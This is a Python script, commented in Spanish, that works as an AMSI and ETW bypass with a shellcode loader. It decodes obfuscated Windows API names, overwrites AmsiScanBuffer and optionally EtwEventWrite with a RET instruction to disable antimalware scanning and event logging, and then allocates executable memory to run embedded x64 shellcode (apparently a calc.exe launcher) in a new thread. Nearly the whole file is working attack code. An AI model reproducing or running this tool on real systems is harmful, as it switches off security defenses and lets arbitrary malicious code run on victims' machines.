import ctypes
import struct
import argparse
import sys
import os

# --- CTYPES SETUP (Windows API Definitions) ---
# Define types used in Windows API functions
LPVOID = ctypes.c_void_p
SIZE_T = ctypes.c_size_t
DWORD = ctypes.c_ulong
BOOL = ctypes.c_bool

# Load necessary DLLs
try:
    kernel32 = ctypes.WinDLL('kernel32.dll')
    ntdll = ctypes.WinDLL('ntdll.dll')

    # Define GetModuleHandleW function signature
    GetModuleHandleW = kernel32.GetModuleHandleW
    GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
    GetModuleHandleW.restype = LPVOID

    # Define GetProcAddress function signature
    GetProcAddress = kernel32.GetProcAddress
    GetProcAddress.argtypes = [LPVOID, ctypes.c_char_p]
    GetProcAddress.restype = LPVOID

    # Define VirtualProtect function signature
    VirtualProtect = kernel32.VirtualProtect
    VirtualProtect.argtypes = [LPVOID, SIZE_T, DWORD, ctypes.POINTER(DWORD)]
    VirtualProtect.restype = BOOL

    # --- CORRECCIONES DE 64-BIT / PUNTERO ---
    # Es VITAL definir explícitamente el restype de VirtualAlloc como LPVOID
    VirtualAlloc = kernel32.VirtualAlloc
    VirtualAlloc.argtypes = [LPVOID, SIZE_T, DWORD, DWORD]
    VirtualAlloc.restype = LPVOID

    # Definición de CreateThread para asegurar que el restype del Handle sea LPVOID
    CreateThread = kernel32.CreateThread
    CreateThread.argtypes = [LPVOID, SIZE_T, LPVOID, LPVOID, DWORD, ctypes.POINTER(DWORD)]
    CreateThread.restype = LPVOID # El HANDLE de hilo es un puntero (LPVOID)
    # ----------------------------------------
    
    # Define RtlMoveMemory (equivalent to memcpy for writing the patch)
    RtlMoveMemory = ntdll.RtlMoveMemory
    RtlMoveMemory.argtypes = [LPVOID, LPVOID, SIZE_T]
    RtlMoveMemory.restype = None

    # Define WaitForSingleObject
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [LPVOID, DWORD]
    WaitForSingleObject.restype = DWORD


    # Memory Protection constants
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READWRITE = 0x40

except Exception as e:
    print(f"[-] Error al cargar ctypes o definir funciones. Asegúrese de que este script se ejecute en Windows. Error: {e}")
    sys.exit(1)

# Verbose print
def verbose(msg, enabled):
    if enabled:
        print(f"[VERBOSE] {msg}")

# Helper to decode unicode byte arrays to strings
def decode_utf16le(byte_list):
    return bytes(byte_list).decode('utf-16le')

# Helper to decode ascii byte arrays to strings
def decode_ascii(byte_list):
    return bytes(byte_list).decode('ascii')

# --- PATCH CONSTANTS ---
# Use 'RET' (0xC3) to bypass AMSI
PATCH_BYTES_AMSI = b"\xC3"  # RET instruction
PATCH_SIZE = len(PATCH_BYTES_AMSI)

# --- MAIN LOGIC ---

def invoke_nullamsi(verbose_flag=False, etw_flag=False):
    print("[*] Iniciando parche AMSI...")

    # 1. Decoding "obfuscated" strings
    get_proc_bytes = [
        71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0,
        99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0,
        115, 0, 115, 0
    ]
    get_mod_bytes = [
        71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0,
        117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0,
        100, 0, 108, 0, 101, 0
    ]

    get_proc = decode_utf16le(get_proc_bytes)
    get_mod = decode_utf16le(get_mod_bytes)

    verbose(f"Decoded function name (GetProc): {get_proc}", verbose_flag)
    verbose(f"Decoded function name (GetMod): {get_mod}", verbose_flag)

    amsi_dll_bytes = [97, 109, 115, 105, 46, 100, 108, 108]
    amsi_init_bytes = [65, 109, 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101]
    amsi_scanbuffer_bytes = [65, 109, 115, 105, 83, 99, 97, 110, 66, 117, 102, 102, 101, 114]  # AmsiScanBuffer

    amsi_dll = decode_ascii(amsi_dll_bytes)
    amsi_init = decode_ascii(amsi_init_bytes)
    amsi_scanbuffer = decode_ascii(amsi_scanbuffer_bytes)

    print(f"[*] DLL de destino: {amsi_dll}")
    print(f"[*] Función de destino: {amsi_init}")
    print(f"[*] Función de destino: {amsi_scanbuffer}")

    # 2. Get function pointers using ctypes
    print("[*] Localizando el módulo AMSI y la dirección de la función...")

    # 2a. Get handle to amsi.dll
    try:
        ctypes.windll.LoadLibrary("amsi.dll")
    except Exception as e:
        print(f"[-] Error cargando amsi.dll: {e}")
        print("[-] Esto puede impedir que el script funcione correctamente.")
        # It's not fatal, so we can continue

    amsi_handle = GetModuleHandleW(amsi_dll)
    if amsi_handle:
        verbose(f"amsi.dll handle encontrado en: 0x{amsi_handle:x}", verbose_flag)
    else:
        print("[-] FALLO: No se pudo obtener el handle a amsi.dll. ¿Está cargado en el proceso?")
        return

    # 2b. Get address of AmsiInitialize
    amsi_init_addr = GetProcAddress(amsi_handle, amsi_init.encode('ascii'))
    if amsi_init_addr:
        print(f"[+] ÉXITO: Dirección de {amsi_init} encontrada en: 0x{amsi_init_addr:x}")
    else:
        print(f"[-] FALLO: No se pudo encontrar la dirección para {amsi_init}.")
        return

    # 2c. Get address of AmsiScanBuffer
    amsi_scanbuffer_addr = GetProcAddress(amsi_handle, amsi_scanbuffer.encode('ascii'))
    if amsi_scanbuffer_addr:
        print(f"[+] ÉXITO: Dirección de {amsi_scanbuffer} encontrada en: 0x{amsi_scanbuffer_addr:x}")
    else:
        print(f"[-] FALLO: No se pudo encontrar la dirección para {amsi_scanbuffer}.")
        return


    # 3. Patch AmsiScanBuffer
    print(f"[*] Parcheando {amsi_scanbuffer}...")

    old_protection = DWORD(0)
    
    # Step 3a: Change memory permissions (R-W-X)
    if VirtualProtect(amsi_scanbuffer_addr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection)):
        verbose(f"Protección de memoria cambiada con éxito a PAGE_EXECUTE_READWRITE en 0x{amsi_scanbuffer_addr:x}", verbose_flag)
        
        # Step 3b: Write the patch bytes
        buffer = (ctypes.c_char * PATCH_SIZE).from_buffer_copy(PATCH_BYTES_AMSI)
        RtlMoveMemory(amsi_scanbuffer_addr, buffer, PATCH_SIZE) 
        
        print(f"[+] Parcheado con éxito {amsi_scanbuffer} en 0x{amsi_scanbuffer_addr:x} con {PATCH_BYTES_AMSI.hex()}")

        # Step 3c: Restore original memory protection
        new_old_protection = DWORD(0)
        if VirtualProtect(amsi_scanbuffer_addr, PATCH_SIZE, old_protection, ctypes.byref(new_old_protection)):
            verbose(f"Protección de memoria restaurada a 0x{old_protection.value:x}", verbose_flag)
            print("[+] Parche AMSI finalizado con éxito.")
        else:
            print("[-] FALLO: No se pudo restaurar la protección de memoria.")
            
    else:
        print("[-] FALLO: No se pudo cambiar la protección de memoria (VirtualProtect falló).")

    # 4. Optional: Patch ETW
    if etw_flag:
        print("\n[*] Parche ETW solicitado...")
        
        # ETW Target: The function commonly targeted is EtwEventWrite from ntdll.dll
        etw_target = b'EtwEventWrite'
        
        etw_addr = GetProcAddress(ntdll._handle, etw_target)
        
        if etw_addr:
            print(f"[+] ÉXITO: Dirección de {etw_target.decode()} encontrada en: 0x{etw_addr:x}")
            
            old_protection_etw = DWORD(0)

            if VirtualProtect(etw_addr, PATCH_SIZE, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protection_etw)):
                verbose(f"Protección de memoria cambiada con éxito a PAGE_EXECUTE_READWRITE en 0x{etw_addr:x}", verbose_flag)

                buffer_etw = (ctypes.c_char * PATCH_SIZE).from_buffer_copy(b"\xC3") # RET
                RtlMoveMemory(etw_addr, buffer_etw, PATCH_SIZE)

                print(f"[+] Parcheado con éxito {etw_target.decode()} en 0x{etw_addr:x} con C3 (RET)")

                 # Restore original memory protection
                new_old_protection_etw = DWORD(0)
                if VirtualProtect(etw_addr, PATCH_SIZE, old_protection_etw, ctypes.byref(new_old_protection_etw)):
                    verbose(f"Protección de memoria restaurada a 0x{old_protection_etw.value:x}", verbose_flag)
                    print("[+] Parche ETW finalizado con éxito.")
                else:
                    print("[-] FALLO: No se pudo restaurar la protección de memoria para ETW.")
            else:
                print("[-] FALLO: No se pudo cambiar la protección de memoria (VirtualProtect falló) para ETW.")

        else:
            print(f"[-] FALLO: No se pudo encontrar la dirección para {etw_target.decode()}.")

# 1. Shellcode de Ejecución (calc.exe)
# ADVERTENCIA: Este shellcode debe ser compatible con la arquitectura de Python (probablemente x64)
SHELLCODE = (
b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
b"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
b"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
b"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
b"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
b"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
b"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
b"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
b"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
b"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
b"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
b"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
b"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
b"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
b"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
)

def load_shellcode_windows(shellcode_bytes):
    """
    Asigna memoria, copia el shellcode y lo ejecuta en un nuevo hilo
    utilizando la API de Windows. Se ha mejorado el manejo de errores.
    """
    
    if not sys.platform.startswith('win'):
        print("[-] Este script está diseñado para Windows.")
        return

    # Definiciones de constantes de la API de Windows
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40

    shellcode_len = len(shellcode_bytes)

    print(f"[#] Intentando cargar shellcode de {shellcode_len} bytes...")
    print(f"[#] Arquitectura de Python: {'64-bit' if sys.maxsize > 2**32 else '32-bit'}")

    # 1. Asignar memoria para el shellcode
    ptr = VirtualAlloc(
        None, 
        shellcode_len, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    )

    if ptr is None or ptr == 0:
        error_code = kernel32.GetLastError()
        print(f"[-] ERROR: VirtualAlloc falló al asignar memoria. Código de error: {error_code}")
        print("[!] Verifique si hay restricciones de seguridad (como DEP) o permisos elevados (Admin) requeridos.")
        return

    print(f"[+] Memoria asignada en: 0x{ptr:x}")

    # 2. Copiar el shellcode a la memoria asignada
    try:
        ctypes.memmove(ptr, shellcode_bytes, shellcode_len)
        print("[+] Shellcode copiado correctamente a la memoria asignada.")
    except Exception as e:
        print(f"[-] ERROR: ctypes.memmove falló al copiar el shellcode. {e}")
        return

    # 3. Ejecutar el shellcode
    h_thread = CreateThread(
        None, 
        0, 
        ptr, 
        None, 
        0, 
        None
    )

    if h_thread is None or h_thread == 0:
        error_code = kernel32.GetLastError()
        print(f"[-] ERROR: CreateThread falló al crear el hilo. Código de error: {error_code}")
        print(f"[!] Nota: La asignación de memoria persiste (0x{ptr:x}).")
        return

    print(f"[+] Shellcode ejecutándose en el hilo (Handle): 0x{h_thread:x}")

    # Esperar a que el hilo termine
    wait_result = WaitForSingleObject(h_thread, 0xFFFFFFFF) 
    
    if wait_result == 0: # WAIT_OBJECT_0
        print("[+] Ejecución del shellcode finalizada (Hilo terminado con éxito).")
    elif wait_result == 0x00000080: # WAIT_ABANDONED (Mutex/Semaphore specific, but can happen)
        print("[!] El hilo del Shellcode se ha detenido de forma inesperada (WAIT_ABANDONED).")
    elif wait_result == 0xFFFFFFFF: # WAIT_FAILED
        error_code = kernel32.GetLastError()
        print(f"[-] ERROR: WaitForSingleObject falló. Código de error: {error_code}")
    else:
        print(f"[!] El hilo terminó con un resultado inesperado: 0x{wait_result:x}")

    # Se podría añadir una llamada a CloseHandle(h_thread) aquí para buenas prácticas.
    

# Entry point
if __name__ == "__main__":
    if os.name != 'nt':
        print("[-] Este script debe ejecutarse en un sistema operativo Windows.")
        sys.exit(1)

    parser = argparse.ArgumentParser(description="AMSI/ETW Patching Tool")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-e", "--etw", action="store_true", help="Attempt ETW patching")

    args = parser.parse_args()

    # Ejecutar el parche de AMSI/ETW
    invoke_nullamsi(verbose_flag=args.verbose, etw_flag=args.etw)

    # El shellcode ahora está correctamente cargado
    # IMPORTANTE: El shellcode DEBE ser de 64 bits si su Python es de 64 bits.
    load_shellcode_windows(SHELLCODE)
